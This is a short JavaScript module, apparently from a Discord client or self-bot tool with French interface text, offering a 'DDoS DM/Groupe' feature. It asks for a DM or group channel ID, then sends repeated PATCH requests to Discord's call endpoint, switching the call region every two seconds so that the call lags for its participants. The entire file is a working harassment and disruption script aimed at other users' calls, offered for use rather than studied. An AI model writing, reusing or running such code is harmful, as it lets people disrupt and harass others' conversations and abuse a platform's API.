const voiceModule = {
    showDdosModal() {
        ui.showModal(`
            <h2>💥 DDoS DM/Groupe</h2>
            <p style="color: #ff6b6b;">Change rapidement la région d'un DM/Groupe pour le lag</p>
            <input type="text" id="ddos-channel-id" placeholder="ID du DM ou Groupe" />
            <button onclick="voiceModule.ddos()" class="danger-btn">Lancer DDoS</button>
        `);
    },

    async ddos() {
        const channelId = document.getElementById('ddos-channel-id').value.trim();
        if (!channelId) {
            alert('Veuillez entrer un ID de salon');
            return;
        }

        ui.closeModal();

        const regions = ["brazil", "hongkong", "india", "japan", "rotterdam"];
        
        try {
            log('💥 Début du DDoS...', 'warning');
            
            for (let i = 0; i < regions.length; i++) {
                try {
                    await discordFetch(`/channels/${channelId}/call`, {
                        method: 'PATCH',
                        body: JSON.stringify({ region: regions[i] })
                    });
                    log(`✓ Région changée: ${regions[i]}`, 'info');
                    await sleep(2000);
                } catch (error) {}
            }
            
            log('✅ DDoS terminé', 'success');
        } catch (error) {
            log(`❌ Erreur: ${error.message}`, 'error');
        }
    }
};
